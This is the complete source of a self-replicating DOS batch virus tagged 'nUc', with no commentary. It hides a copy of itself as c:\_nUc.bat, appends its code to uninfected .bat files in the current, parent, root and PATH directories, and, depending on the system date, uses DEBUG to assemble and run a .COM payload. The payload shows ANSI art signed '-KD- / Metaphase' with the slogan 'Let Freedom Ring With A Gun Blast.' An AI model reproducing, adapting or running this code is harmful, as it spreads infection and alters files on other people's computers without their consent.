@echo off%_nUc%
if '%1=='nUc goto nUc%2
set nUc=%0.bat
if not exist %nUc% set nUc=%0
if '%nUc%==' set nUc=autoexec.bat
if exist c:\_nUc.bat goto nUc_go
if not exist %nUc% goto nUc_Leii
find "nUc"<%nUc%>c:\_nUc.bat
attrib c:\_nUc.bat +h
:nUc_go
if '%!nUc%=='--- goto nUc_pay
set !nUc=%!nUc%-
command /e:5000 /c c:\_nUc nUc v . .. \ %path%
:nUc_Leii
set nUc=
goto nUc_pay
:nUc_v
shift%_nUc%
if '%2==' goto nUc_pay
for %%a in (%2\*.bat %2*.bat) do call c:\_nUc nUc infect %%a 
goto nUc_v
:nUc_infect
find "nUc"<%3>nul
if not errorlevel 1 goto nUc_jump
type %3>nUc$
echo.>>nUc$
type c:\_nUc.bat>>nUc$
move nUc$ %3>nul
set nUc#=%nUc#%-
if %nUc#%==--- exit 
:nUc_jump
set nUc!=%nUc!%-
if %nUc!%==--- exit  
:nUc_pay
echo.|date|find "20">nul.nUc
if errorlevel 1 goto nUc_exit
echo n $nUc$.com>nUc.t
echo e 0100 EB 3D 90 00 47 04 02 00 00 54 68 65 44 72 61 77>>nUc.t
echo e 0110 20 43 4F 4D 20 66 69 6C 65 20 53 63 72 65 65 6E>>nUc.t  
echo e 0120 20 53 61 76 65 1A 55 6E 73 75 70 70 6F 72 74 65>>nUc.t  
echo e 0130 64 20 56 69 64 65 6F 20 4D 6F 64 65 0D 0A 24 B4>>nUc.t 
echo e 0140 0F CD 10 BB 00 B8 3C 02 74 18 3C 03 74 14 C6 06>>nUc.t 
echo e 0150 03 01 00 BB 00 B0 3C 07 74 08 BA 26 01 B4 09 CD>>nUc.t 
echo e 0160 21 C3 8E C3 8B 3E 07 01 BE F0 01 BA DA 03 B3 09>>nUc.t 
echo e 0170 8B 0E 04 01 FC 33 C0 AC 3C 1B 75 05 80 F4 80 EB>>nUc.t 
echo e 0180 6A 3C 10 73 07 80 E4 F0 0A E0 EB 5F 3C 18 74 13>>nUc.t 
echo e 0190 73 1F 2C 10 02 C0 02 C0 02 C0 02 C0 80 E4 8F 0A>>nUc.t 
echo e 01A0 E0 EB 48 8B 3E 07 01 81 C7 A0 00 89 3E 07 01 EB>>nUc.t 
echo e 01B0 3A 8B E9 B9 01 00 3C 19 75 08 AC 8A C8 B0 20 4D>>nUc.t 
echo e 01C0 EB 0A 3C 1A 75 07 AC 4D 8A C8 AC 4D 41 80 3E 03>>nUc.t 
echo e 01D0 01 00 74 13 8A F8 EC D0 D8 72 FB EC 22 C3 75 FB>>nUc.t 
echo e 01E0 8A C7 AB E2 F1 EB 02 F3 AB 8B CD E3 02 E2 88 C3>>nUc.t 
echo e 01F0 0F 10 19 4F 18 19 4F 18 0C DA 1A 4D C4 BF 18 B3>>nUc.t 
echo e 0200 0F 19 4D 0C B3 18 B3 0F 19 14 DC 07 DC 0F 19 05>>nUc.t 
echo e 0210 0C DB DB DB BB 0F 19 02 0C DB DB BB 0F 20 0C DB>>nUc.t 
echo e 0220 DB BB 0F 19 02 0C DB DB BB 0F 20 20 0C 1A 05 DB>>nUc.t 
echo e 0230 BB 0F 19 05 0C 1A 04 DB BB 0F 19 07 0C B3 18 B3>>nUc.t 
echo e 0240 0F 19 13 DE 07 DB 08 DB DD 0F 19 04 0C 1A 03 DB>>nUc.t 
echo e 0250 BB 0F 20 20 0C DB DB BA 0F 20 0C DB DB BA 0F 19>>nUc.t 
echo e 0260 02 0C DB DB BA 0F 20 0C DB DB C9 1A 03 CD BC 0F>>nUc.t 
echo e 0270 19 04 0C DB DB C9 CD CD DB DB BB 0F 19 06 0C B3>>nUc.t 
echo e 0280 18 B3 0F 19 13 17 DD 08 DC DB 10 DC 0F 19 04 0C>>nUc.t 
echo e 0290 DB DB C9 DB DB BB 0F 20 0C DB DB BA 0F 20 0C DB>>nUc.t 
echo e 02A0 DB BA 0F 19 02 0C DB DB BA 0F 20 0C DB DB BA 0F>>nUc.t 
echo e 02B0 19 09 0C 1A 06 DB BA 0F 19 06 0C B3 18 B3 0F 19>>nUc.t 
echo e 02C0 02 DC 08 DC DC 0F 19 05 DC DC 08 17 DC DC 07 10>>nUc.t 
echo e 02D0 DF DC 0F DC 17 DF 07 10 DB DF DF DF 08 17 DF 10>>nUc.t 
echo e 02E0 DC 0F 19 02 0C DB DB BA C8 DB DB BB DB DB BA 0F>>nUc.t 
echo e 02F0 20 0C DB DB BA 0F 19 02 0C DB DB BA 0F 20 0C DB>>nUc.t  
echo e 0300 DB BA 0F 19 09 0C DB DB C9 CD CD DB DB BA 0F 19>>nUc.t 
echo e 0310 06 0C B3 18 B3 07 19 02 0F DE 17 DD 08 DB DB 0F>>nUc.t 
echo e 0320 10 20 DC DC 17 DF DF 07 10 DB 08 17 DE 10 DF 0F>>nUc.t 
echo e 0330 DC DB 17 DF 20 07 10 DB 0F 19 04 07 DB 08 DD 0F>>nUc.t 
echo e 0340 20 20 0C DB DB BA 0F 20 0C C8 1A 03 DB BA 0F 20>>nUc.t   
echo e 0350 0C C8 1A 05 DB C9 BC 0F 20 0C C8 1A 05 DB BB 0F>>nUc.t 
echo e 0360 20 0C DB DB BB 0F 20 0C DB DB BA 0F 20 20 0C DB>>nUc.t  
echo e 0370 DB BA 0F 19 06 0C B3 18 B3 0F 19 03 17 DB 08 DE>>nUc.t 
echo e 0380 DF 0F DF 07 10 DF DF 08 DC 07 DB DB 08 DE 0F DE>>nUc.t 
echo e 0390 17 DF 07 10 DB 0F 17 DC DD 07 10 DD 0F 19 04 07>>nUc.t 
echo e 03A0 DE 08 17 DE 0F 10 20 20 0C C8 CD BC 0F 20 20 0C>>nUc.t 
echo e 03B0 C8 CD CD CD BC 0F 20 20 0C C8 1A 04 CD BC 0F 19>>nUc.t 
echo e 03C0 02 0C C8 1A 04 CD BC 0F 20 0C C8 CD BC 0F 20 0C>>nUc.t 
echo e 03D0 C8 CD BC 0F 20 20 0C C8 CD BC 0F 19 06 0C B3 18>>nUc.t 
echo e 03E0 B3 0F 19 03 17 DD 10 DF DC DC 17 DB 08 10 DB DE>>nUc.t 
echo e 03F0 17 DD DE 10 DD 0F 17 DC DB DB DF 07 10 DB 0F 19>>nUc.t 
echo e 0400 06 08 17 DE 0F 10 19 32 0C B3 18 B3 0F 19 03 DE>>nUc.t 
echo e 0410 DE 17 DF DC 08 DE 10 DD DE 17 DD DE 10 DD 0F 17>>nUc.t 
echo e 0420 DC DB DF DF DD 07 10 DD 0F 19 04 07 DE 08 17 DE>>nUc.t 
echo e 0430 0F 10 19 32 0C B3 18 B3 0F 19 03 DD 17 DB 20 08>>nUc.t 
echo e 0440 DC 10 DB DD DE 17 DB DE 10 DB 07 DE DB DB DB 08>>nUc.t 
echo e 0450 17 DE 07 10 DB 0F 19 04 07 DB 08 DD 0F 19 02 0C>>nUc.t 
echo e 0460 19 02 4C 65 74 20 46 72 65 65 64 6F 6D 20 52 69>>nUc.t 
echo e 0470 6E 67 20 57 69 74 68 20 41 20 47 75 6E 20 42 6C>>nUc.t 
echo e 0480 61 73 74 2E 19 0A B3 18 B3 0F 19 03 DD 17 DD 08>>nUc.t 
echo e 0490 DB DB 10 DB DB DE 17 DB DE 10 DB DC DF 17 DC DC>>nUc.t 
echo e 04A0 DB DC 07 10 DB DC DC DC 08 17 DC 10 DF 0F 20 20>>nUc.t 
echo e 04B0 07 20 0F 19 30 0C B3 18 B3 07 19 02 0F DE DD 17>>nUc.t 
echo e 04C0 DD 08 DC DC 10 DB DD DE 17 DB DE 10 DB DD 07 DB>>nUc.t 
echo e 04D0 DC DC DC 08 1A 04 DF 0F 19 10 0A 2D 4B 44 2D 20>>nUc.t 
echo e 04E0 2F 20 4D 65 74 61 70 68 61 73 65 0F 19 14 0C B3>>nUc.t 
echo e 04F0 18 B3 07 19 02 0F DE 17 DD 10 DE 17 20 20 08 DE>>nUc.t 
echo e 0500 10 DD 20 DB 07 DB 08 DB DB DE 07 DB DB 08 DE DB>>nUc.t 
echo e 0510 DB DD 19 02 0F 19 0E 0A 19 10 0F 19 14 0C B3 18>>nUc.t 
echo e 0520 B3 07 19 02 0F DE 17 DD 07 10 DD 0F 17 FE DC 20>>nUc.t 
echo e 0530 08 10 DB 20 17 DD 07 10 DB 08 DB DB DC DF DF DD>>nUc.t 
echo e 0540 DB DF 0F 19 38 0C B3 18 B3 0F 19 03 17 DB 07 10>>nUc.t 
echo e 0550 DB DC DC 0F DF 08 DF DB 00 17 DD 20 08 DE 10 1A>>nUc.t 
echo e 0560 04 DB 0F 19 3A 0C B3 18 B3 0F 19 03 DF 07 DB DD>>nUc.t 
echo e 0570 DB DB DB DC 17 20 10 DB DB 08 1A 03 DB DD 20 0F>>nUc.t 
echo e 0580 19 39 0C B3 18 B3 07 19 02 06 DE DB DC 07 DE DC>>nUc.t 
echo e 0590 DF DF DF 08 17 DC DC DB DB 10 DB DB DF 20 20 0F>>nUc.t 
echo e 05A0 19 12 0A 20 0F 19 23 0A 20 20 0C B3 18 B3 07 19>>nUc.t 
echo e 05B0 02 06 DE 17 DD 10 DB DD 07 DD 0F DD 08 17 DE 10>>nUc.t 
echo e 05C0 DB 20 07 DB 08 DB DC 0F 19 3E 0C B3 18 B3 07 19>>nUc.t 
echo e 05D0 02 06 DE 17 DD 10 DB DB 20 0F DD 07 DE 08 17 DB>>nUc.t 
echo e 05E0 10 DD 17 DE 10 DB DB DD 0F 19 3D 0C B3 18 B3 07>>nUc.t 
echo e 05F0 19 02 06 DE 17 DE 10 DB DB DD 0F DE 20 07 DF 08>>nUc.t 
echo e 0600 DF 17 DE 10 DB DB DD 0F 19 3D 0C B3 18 B3 07 19>>nUc.t 
echo e 0610 02 06 DB 17 DE 10 DB DB DB 07 DE 20 20 DE 08 DB>>nUc.t 
echo e 0620 DB DB 0F 19 33 0C 19 05 31 39 39 38 0F 20 0C B3>>nUc.t 
echo e 0630 18 C0 1A 4D C4 D9 18>>nUc.t  
echo rcx>>nUc.t
echo 5C0>>nUc.t
echo w>>nUc.t
echo q>>nUc.t
debug<nUc.t>nul
del nUc.t
$nUc$
del $nUc$.com                    
:nUc_exit